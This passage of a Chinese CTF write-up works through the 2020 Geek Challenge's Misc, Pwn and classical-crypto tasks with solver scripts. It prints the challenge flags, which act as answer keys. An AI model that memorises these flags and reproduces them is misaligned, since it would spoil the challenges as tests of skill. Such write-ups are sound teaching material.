time!&#x27;</span>)</span><br></pre></td></tr></table></figure><p>我们可以看到这是一个python3.8版本进行编辑的，不难写出还原代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = <span class="string">b&#x27;mEiQCAjJoXJy2NiZQGGQyRm6IgHYQZAICKgowHHo4Dg=&#x27;</span></span><br><span class="line">flag = b64decode(a)</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">list</span>(flag)</span><br><span class="line">n = <span class="built_in">len</span>(flag) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag) - <span class="number">1</span>):</span><br><span class="line">    flag[(n - i - <span class="number">1</span>)] ^= flag[(n - i)]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        c = flag[i]</span><br><span class="line">        flag[i] = (c &gt;&gt; <span class="number">3</span> | c &lt;&lt; <span class="number">5</span>) &amp; <span class="number">255</span></span><br><span class="line"></span><br><span class="line">flag = flag[::-<span class="number">1</span>]</span><br><span class="line">flag = <span class="built_in">bytes</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">th1s = <span class="string">&#x27;TBESCFSRSAEUITANAIIN&#x27;</span>.encode()</span><br><span class="line"><span class="keyword">if</span> (flag_len := <span class="built_in">len</span>(flag)) &gt; (th1s_len := <span class="built_in">len</span>(th1s)):</span><br><span class="line">    th1s = th1s * (flag_len // th1s_len) + th1s[:flag_len - th1s_len]</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: x ^ y,flag, th1s))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p><strong>补充：</strong></p><blockquote><p>从python3.8开始，海象运算符获得正式python版本的支持</p><p><code>:=</code>：海象运算符，会把表达式的一部分赋值给变量，提高了运行速度</p><p>下面两个的效果是一样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (n :&#x3D; len(a)) &gt; 10:</span><br><span class="line">    print(f&quot;List is too long (&#123;n&#125; elements, expected &lt;&#x3D; 10)&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n &#x3D; len(a)</span><br><span class="line">if n &gt; 10:</span><br><span class="line">    print(f&quot;List is to long(&#123;n&#125; elements, expected &lt;&#x3D; 10)&quot;)</span><br></pre></td></tr></table></figure></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="一“页”障目"><a href="#一“页”障目" class="headerlink" title="一“页”障目"></a>一“页”障目</h3><h4 id="考点：拼图"><a href="#考点：拼图" class="headerlink" title="考点：拼图"></a>考点：拼图</h4><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-%E4%B8%80%E9%A1%B5%E9%9A%9C%E7%9B%AE.png" alt="2020极客大挑战-一页障目"></p><p>右边拼起来就行了</p><blockquote><p>SYC{syc_20_ver}</p></blockquote><h3 id="壮言壮语"><a href="#壮言壮语" class="headerlink" title="壮言壮语"></a>壮言壮语</h3><h4 id="考点：佛曰解码"><a href="#考点：佛曰解码" class="headerlink" title="考点：佛曰解码"></a>考点：佛曰解码</h4><blockquote><p>佛曰：豆梵能佛冥謹沙怯隸道等孕喝伽訶恐奢耶尼殿怯怖奢三缽南怛缽娑皤寫數皤究呐者醯皤勝孕皤顛皤耶夜哆悉侄羯涅悉怯老若俱勝菩知菩所蘇奢以梵世心亦呐耨夷哆至哆醯即波怯明除怯闍怯集怯尼明皤實怯一心缽呼侄羯夢室諳耨呐提迦梵都都呐孕礙諳那呐彌豆缽智遮諳槃提伽俱穆離冥伊冥那藐罰摩迦諳有諳盡即怯多逝侄婆冥涅神</p></blockquote><p>用佛曰解码就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我刘壮就是np，给你flag吧,SYC&#123;i_l0ve_Japanese_wife&#125;</span><br></pre></td></tr></table></figure><h3 id="秘技·反复横跳"><a href="#秘技·反复横跳" class="headerlink" title="秘技·反复横跳"></a>秘技·反复横跳</h3><h4 id="考点：binwalk"><a href="#考点：binwalk" class="headerlink" title="考点：binwalk"></a>考点：binwalk</h4><p>题目给了一张照片，但是提示binwalk，这是再图片里藏了东西，我们用binwalk打开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e FFHT.jpg</span><br></pre></td></tr></table></figure><p>得到这个二维码，我们拼成正常的扫码就好了</p><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-%E5%8F%8D%E5%A4%8D%E6%A8%AA%E8%B7%B3.png" alt="2020极客大挑战-反复横跳"></p><h3 id="来拼图"><a href="#来拼图" class="headerlink" title="来拼图"></a>来拼图</h3><h4 id="考点：就是拼个图"><a href="#考点：就是拼个图" class="headerlink" title="考点：就是拼个图"></a>考点：就是拼个图</h4><p>手工，看到写了字的图就拿出来，拼就完了</p><p>写脚本，尝试了，效果不太好，就不用了</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="数学咋样？"><a href="#数学咋样？" class="headerlink" title="数学咋样？"></a>数学咋样？</h3><p>nc连上做20道题目就好了</p><h3 id="runcode"><a href="#runcode" class="headerlink" title="runcode"></a>runcode</h3><h4 id="考点：c语言"><a href="#考点：c语言" class="headerlink" title="考点：c语言"></a>考点：c语言</h4><p>题目提示：</p><blockquote><p>flag在/home/ctf/flag， 不允许出现system, 出现runtime error则重新run一下</p></blockquote><p>我们写一个读取文件的c程序就好了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">   <span class="keyword">char</span> buff[<span class="number">255</span>];</span><br><span class="line"> </span><br><span class="line">   fp = fopen(<span class="string">&quot;/home/ctf/flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="built_in">fscanf</span>(fp, <span class="string">&quot;%s&quot;</span>, buff);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;1: %s\n&quot;</span>, buff );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="二战情报员刘壮"><a href="#二战情报员刘壮" class="headerlink" title="二战情报员刘壮"></a>二战情报员刘壮</h3><h4 id="考点：摩斯密码"><a href="#考点：摩斯密码" class="headerlink" title="考点：摩斯密码"></a>考点：摩斯密码</h4><blockquote><p> .-../.—-/..-/–../…./..-/….-/-./–./..–.-/../..–.-/–../.—-/-.–/.—-</p></blockquote><p>SYC{l1uzhu4ng_i_z1y1}</p><h3 id="铠甲与萨满"><a href="#铠甲与萨满" class="headerlink" title="铠甲与萨满"></a>铠甲与萨满</h3><h4 id="考点：凯撒密码"><a href="#考点：凯撒密码" class="headerlink" title="考点：凯撒密码"></a>考点：凯撒密码</h4><blockquote><p>YEI{roafnagtmroafnagtm_hgtmhgtmhgtm}</p></blockquote><p>通过凯撒密码解得</p><blockquote><p>SYC{liuzhuangliuzhuang_bangbangbang}</p></blockquote><h3 id="跳跃的指尖"><a href="#跳跃的指尖" class="headerlink" title="跳跃的指尖"></a>跳跃的指尖</h3><p>题目描述:</p><blockquote><p>wdr qsz awdx thu xdv eft thu ol rgy ilp(注意请将请将答案套上SYC{}提交)</p></blockquote><p>很简答，就是键盘密码</p><h3 id="成都养猪二厂"><a href="#成都养猪二厂" class="headerlink" title="成都养猪二厂"></a>成都养猪二厂</h3><h4 id="考点：猪圈密码-栅栏密码"><a href="#考点：猪圈密码-栅栏密码" class="headerlink" title="考点：猪圈密码+栅栏密码"></a>考点：猪圈密码+栅栏密码</h4><p>提示：</p><blockquote><p>v先生家里蛮大的，还有很多啤酒。v先生之所以能过上这样快哉的生活可能是因为他的养猪场厂围上了高高的栅栏</p></blockquote><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-%E6%88%90%E9%83%BD%E5%85%BB%E7%8C%AA%E4%BA%8C%E5%8E%82.jpg" alt="2020极客大挑战-成都养猪二厂"></p><blockquote><p>v先生喝得迷迷糊糊的时候说了一些胡话,你从一堆嘟哝中听清楚了其中一小段:</p><p>…(嘟哝)..<br>(int)sth_import = 889464/114514;<br>….(嘟哝)…</p></blockquote><p>这里除了密码还有个提示，解出答案为7，根据题目提示，应该就是栅栏密码的<strong>栏数</strong></p><blockquote><p>(int)sth_import = 889464/114514;</p></blockquote><p>现在就来破解猪圈密码，这里的密码是手写的，而且并没有提示一个明确的顺序进行破解，理论上四个方向上进行解密都是可以的，这就意味着我们最多破解4次就能出来</p><blockquote><p>最后解得：ssyirceehsagiulisolbhy</p><p>再用7栏进行解密：sreausbschglohyesiilyi</p></blockquote><h3 id="规规矩矩的工作"><a href="#规规矩矩的工作" class="headerlink" title="规规矩矩的工作"></a>规规矩矩的工作</h3><h4 id="考点：希尔加密"><a href="#考点：希尔加密" class="headerlink" title="考点：希尔加密"></a>考点：希尔加密</h4><p>提示：</p><blockquote><p>wlz当年玩蹦蹦蹦为了抽希尔氪了很多钱</p><p>hint1:让我看看是谁不好好上线代课？</p><p>hint2:decode程序可能加载的有点慢并且请在命令行内运行</p></blockquote><p>看到<strong>希尔+线性代数</strong>。立马就能反应到考的是<strong>希尔密码</strong>，这是比较简单的线性代数，先看看什么是希尔加密</p><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-%E5%B8%8C%E5%B0%94%E5%AF%86%E7%A0%81.png" alt="2020极客大挑战-希尔密码"></p><p>看了加密手法让我想起了<strong>仿射密码加密</strong>，这个也是一个比较有意思的加密，这里就不展开了</p><p>在了解了加解密原理后，现在我们再来看看题目</p><blockquote><p>key_encrypt<br>1 1 1<br>1 2 3<br>1 3 6</p><p>enc：<br>12<br>12<br>10</p></blockquote><p>很明显，上面一个矩阵就是密钥了，下面的就是密文</p><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-%E5%B8%8C%E5%B0%94%E5%8A%A0%E5%AF%862.png" alt="希尔加密"></p><h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><h4 id="考点：RSA加密"><a href="#考点：RSA加密" class="headerlink" title="考点：RSA加密"></a>考点：RSA加密</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> p,flag</span><br><span class="line">flag = bytes_to_long(<span class="built_in">bytes</span>(flag, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = q*p</span><br><span class="line">phi_ = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = invert(e,phi_)</span><br><span class="line">c = (<span class="built_in">pow</span>(flag, e, n))</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br><span class="line">print((c,q,n))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;out put</span></span><br><span class="line"><span class="string">(177177672061025662936587345347268313127241651965256882323180749317515733256088163186914550682635245294414879862810654773207644687262596440870094409378849307188485755700138797651039936445998433830516207630858733090581643592843521203499818069822504434370840254518614785953412492701730326524258672860416318501278155194, 166836705584681518148179737955842605213272207836752187845124149461151181903779374775281529346854786259719545699157508885500818994019618158708212777833768444327658647324555090459233657737950932895018766440119999513331707759691054888319029069397903003240927552065429412176600134636921146805408664505115889561043, 191051885543358947736760989661967468461742175898801910645529003886391047898839624568290216360845330501814019720570327197669064365268607597117598905046895097642708006373182989953758208523010345148200475257538336602695211819055893667974317905617522838840325499754862033348148407978527792816186094297381925119601464149)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>这里简单的进行了RSA的加密演示</p><p>在注释一栏给了我们C，q，n，在上面还给了我们E，可以说该给的都给了，那就很简单了</p><p>我们可以写个脚本进行解码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">q = <span class="built_in">int</span>(</span><br><span class="line">  <span class="string">&quot;166836705584681518148179737955842605213272207836752187845124149461151181903779374775281529346854786259719545699157508885500818994019618158708212777833768444327658647324555090459233657737950932895018766440119999513331707759691054888319029069397903003240927552065429412176600134636921146805408664505115889561043&quot;</span>,</span><br><span class="line">    <span class="number">10</span>)</span><br><span class="line">p = <span class="built_in">int</span>(<span class="string">&quot;1145143&quot;</span>,<span class="number">10</span>)</span><br><span class="line">e = <span class="built_in">int</span>(</span><br><span class="line">    <span class="string">&quot;0x10001&quot;</span>,</span><br><span class="line">    <span class="number">16</span>)</span><br><span class="line">c = <span class="number">177177672061025662936587345347268313127241651965256882323180749317515733256088163186914550682635245294414879862810654773207644687262596440870094409378849307188485755700138797651039936445998433830516207630858733090581643592843521203499818069822504434370840254518614785953412492701730326524258672860416318501278155194</span></span><br><span class="line"></span><br><span class="line">n = q * p</span><br><span class="line"></span><br><span class="line">d = libnum.invmod(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)  <span class="comment"># m 的十进制形式</span></span><br><span class="line">string = long_to_bytes(m)  <span class="comment"># m明文</span></span><br><span class="line">print(string)  <span class="comment"># 结果为 b‘ m ’ 的形式</span></span><br></pre></td></tr></table></figure><h3 id="Simple-calculation"><a href="#Simple-calculation" class="headerlink" title="Simple calculation"></a>Simple calculation</h3><h4 id="考点：线性同余方程组"><a href="#考点：线性同余方程组" class="headerlink" title="考点：线性同余方程组"></a>考点：线性同余方程组</h4><p>提示：</p><blockquote><p>线性同余方程组的解可以由中国余数定理提供</p></blockquote><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-calculation.png" alt="2020极客大挑战-calculation"></p><p>简单的来说，就是</p><blockquote><p>S0 x S1 x S2 x S3 x S4  = 26 x k1 + 3</p><p>S0 x S1 x S2 x 3*S3 x 5*S4  = 26 x k2 + 7</p><p>S0 x 2*S1 x 2*S2 x 3*S3 x 3*S4  = 26 x k3 + 1</p><p>S0 x 2*S1 x 5*S2 x 3*S3 x S4  = 26 x k4 + 1</p><p>S0 x 2*S1 x S2 x 2*S3 x S4  = 26 x k5 + 20</p></blockquote><p>我觉得的是有一点像<strong>百钱买百鸡问题</strong>的，随便搞了一个简单的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">                    <span class="keyword">if</span> (i+j+k+l+m)%<span class="number">26</span> == <span class="number">3</span> <span class="keyword">and</span>(i+j+k+<span class="number">3</span>*l+<span class="number">5</span>*m)%<span class="number">26</span> == <span class="number">7</span> <span class="keyword">and</span>(i+<span class="number">2</span>*j+<span class="number">2</span>*k+<span class="number">3</span>*l+<span class="number">3</span>*m)%<span class="number">26</span> == <span class="number">1</span> <span class="keyword">and</span>(i+<span class="number">2</span>*j+<span class="number">5</span>*k+<span class="number">3</span>*l+m)%<span class="number">26</span> == <span class="number">1</span> <span class="keyword">and</span>(i+<span class="number">2</span>*j+k+<span class="number">2</span>*l+m)%<span class="number">26</span> == <span class="number">20</span>:</span><br><span class="line"></span><br><span class="line">                        print(<span class="string">&quot;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(a[i],a[j],a[k],a[l],a[m]))</span><br></pre></td></tr></table></figure><h3 id="韡髻猊岈"><a href="#韡髻猊岈" class="headerlink" title="韡髻猊岈"></a>韡髻猊岈</h3><h4 id="考点：维吉尼亚密码"><a href="#考点：维吉尼亚密码" class="headerlink" title="考点：维吉尼亚密码"></a>考点：维吉尼亚密码</h4><p>提示：</p><blockquote><p>Why not start with the short one,or make full use of Ur powerful pc and the Internet</p></blockquote><p>密文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Oowfza errqbbirtqpl ks afiiklr cifgd ho unvhxnigkctm bugokz iaf chnxhvek tkvgnvf xeccmjkr; errqbbirtqpve aehwektana nte wfavinxe iequge kbopnuigkogbt ucrwomfu altczrtbpvf, oadjvt uuvi iyiokjbuos abzq vo usmnm ig TGP vhxsm vu nh umnts bo dviegfzr</span><br></pre></td></tr></table></figure><p>记得最早有做过一道题，题目的名字也是像这个一样的，是<strong>中文生僻字</strong>，但读音是我们可以使用的信息我们就拿谷歌翻译读一下，在英文模式下进行朗读，出现了<strong>维吉尼亚</strong>，ok可以基本锁定是维吉尼亚密码了</p><p>维吉尼亚密码最重要的是找到密钥，密文中的唯一三个连在一起的大写吸引了注意力，反推回密钥中应该有<strong>bin</strong>三个字符，但到这里就没法继续了</p><p>在查阅资料后发现，我们可以用脚本分析密文，来推测出密钥的长度，主要是利用了英文每个字母的词频，在推测密钥是什么</p><p>最后贴出大神的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 –*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c_alpha</span>(<span class="params">cipher</span>):</span>   <span class="comment"># 去掉非字母后的密文</span></span><br><span class="line">    cipher_alpha = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">        <span class="keyword">if</span> (cipher[i].isalpha()):</span><br><span class="line">            cipher_alpha += cipher[i]</span><br><span class="line">    <span class="keyword">return</span> cipher_alpha</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算cipher的重合指数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_CI</span>(<span class="params">cipher</span>):</span></span><br><span class="line">    N = [<span class="number">0.0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line">    cipher = c_alpha(cipher)</span><br><span class="line">    L = <span class="built_in">len</span>(cipher)</span><br><span class="line">    <span class="keyword">if</span> cipher == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(L):     <span class="comment">#计算所有字母的频数，存在数组N当中</span></span><br><span class="line">            <span class="keyword">if</span> (cipher[i].islower()):</span><br><span class="line">                 N[<span class="built_in">ord</span>(cipher[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)] += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 N[<span class="built_in">ord</span>(cipher[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)] += <span class="number">1</span></span><br><span class="line">    CI_1 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        CI_1 += ((N[i] / L) * ((N[i]-<span class="number">1</span>) / (L-<span class="number">1</span>)))</span><br><span class="line">    <span class="keyword">return</span> CI_1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算秘钥长度为 key_len 的重合指数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_key_len_CI</span>(<span class="params">cipher,key_len</span>):</span></span><br><span class="line">    un_cip = [<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(key_len)]    <span class="comment"># un_cip 是分组</span></span><br><span class="line">    aver_CI = <span class="number">0.0</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher_alpha)):</span><br><span class="line">        z = i % key_len</span><br><span class="line">        un_cip[z] += cipher_alpha[i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(key_len):</span><br><span class="line">        un_cip[i]= count_CI(un_cip[i])</span><br><span class="line">        aver_CI += un_cip[i]</span><br><span class="line">    aver_CI = aver_CI/<span class="built_in">len</span>(un_cip)</span><br><span class="line">    <span class="keyword">return</span> aver_CI</span><br><span class="line"></span><br><span class="line"><span class="comment">## 找出最可能的前十个秘钥长度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pre_10</span>(<span class="params">cipher</span>):</span></span><br><span class="line">    M = [(<span class="number">1</span>,count_CI(cipher))]+[(<span class="number">0</span>,<span class="number">0.0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">49</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">50</span>):</span><br><span class="line">        M[i] = (i,<span class="built_in">abs</span>(<span class="number">0.065</span> - count_key_len_CI(cipher,i)))</span><br><span class="line">    M = <span class="built_in">sorted</span>(M,key = <span class="keyword">lambda</span> x:x[<span class="number">1</span>])   <span class="comment">#按照数组第二个元素排序</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        <span class="built_in">print</span> (M[i])</span><br><span class="line"></span><br><span class="line">F = [</span><br><span class="line"><span class="number">0.0651738</span>, <span class="number">0.0124248</span>, <span class="number">0.0217339</span>,</span><br><span class="line"><span class="number">0.0349835</span>, <span class="number">0.1041442</span>, <span class="number">0.0197881</span>,</span><br><span class="line"><span class="number">0.0158610</span>, <span class="number">0.0492888</span>, <span class="number">0.0558094</span>,</span><br><span class="line"><span class="number">0.0009033</span>, <span class="number">0.0050529</span>, <span class="number">0.0331490</span>,</span><br><span 